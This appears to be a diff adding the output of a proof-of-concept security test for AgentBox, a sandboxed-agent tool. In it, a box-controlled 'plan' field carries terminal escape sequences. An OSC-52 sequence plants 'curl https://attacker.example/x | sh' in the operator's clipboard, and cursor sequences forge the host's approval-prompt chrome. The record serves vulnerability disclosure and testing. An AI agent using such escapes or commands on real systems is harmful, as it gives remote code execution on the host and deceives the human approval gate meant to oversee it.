@@ -1,0 +1,20 @@
+
+== 1. The untrusted box sets its "plan" to a string full of terminal escapes ==
+   box -> ctl socket: {op:"claude-state", state:"end-plan", plan:{plan:"...ESC]52;c;<b64>BEL...ESC[1A..."}}
+   OSC-52 would copy to the HOST clipboard: "curl https://attacker.example/x | sh"
+
+== 2. Host renders it via the REAL sink: process.stdout.write(claude.plan.plan) ==
+   bytes written to the operator's stream: 135
+     contains raw OSC-52 clipboard-write sequence: true
+     contains raw CSI cursor/erase (chrome forge):  true
+
+== 3. The fix already in the tree (sanitize) would have neutralized it -- but is not applied here ==
+   sanitize(plan) still contains escapes: false
+   sanitize(plan) = "benign looking plan text ]52;c;Y3VybCBodHRwczovL2F0dGFja2VyLmV4YW1wbGU"...
+
+== 4. Result ==
+VULNERABLE -- box-controlled control bytes reach the host operator's terminal unmodified.
+   Impact: (1) OSC-52 plants an attacker command in the HOST clipboard -> host RCE on the
+   operator's next paste; (2) cursor/erase sequences forge host-terminal content, including
+   the AgentBox approval-prompt chrome -> social-engineer the host-action approval gate.
+   The same fields also render raw in `claude attach` (alert band) and the dashboard sidebar.
